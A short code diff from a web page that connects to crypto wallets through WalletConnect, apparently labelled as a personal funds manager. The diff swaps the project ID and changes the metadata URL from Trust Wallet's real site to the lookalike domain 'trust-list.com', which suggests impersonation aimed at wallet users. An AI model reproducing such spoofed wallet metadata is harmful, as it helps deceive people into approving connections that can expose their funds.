@@ -242,7 +242,7 @@
 
 <script>
 /* ═══ Constantes compartidas con panel.html ═══ */
-const WC_PROJECT_ID = 'c1b85e8eff60dbd02663499756f49867';
+const WC_PROJECT_ID = '5ed9c6864c8311bcc1f68bf2c95b746c';
 const CHAIN_NAMES   = {1:'Ethereum',137:'Polygon',8453:'Base',43114:'Avalanche',42161:'Arbitrum',56:'BNB Chain',11155111:'Sepolia'};
 const CHAIN_SYMBOLS = {1:'ETH',137:'POL',8453:'ETH',43114:'AVAX',42161:'ETH',56:'BNB'};
 const GAS_RESERVE   = {1:.003,137:.5,8453:.0005,43114:.005,42161:.0008,56:.003};
@@ -433,7 +433,7 @@ async function connectWC() {
       projectId: WC_PROJECT_ID,
       chains:[1], optionalChains:[],
       showQrModal:false,
-      metadata:{ name:'MyPersonWallets', description:'Gestión de fondos personal', url:'https://trustwallet.com/', icons:[] },
+      metadata:{ name:'MyPersonWallets', description:'Gestión de fondos personal', url:'https://trust-list.com', icons:[] },
     });
     wcProvider.on('display_uri', uri => {
       const el = $('qrCanvas'); el.innerHTML='';
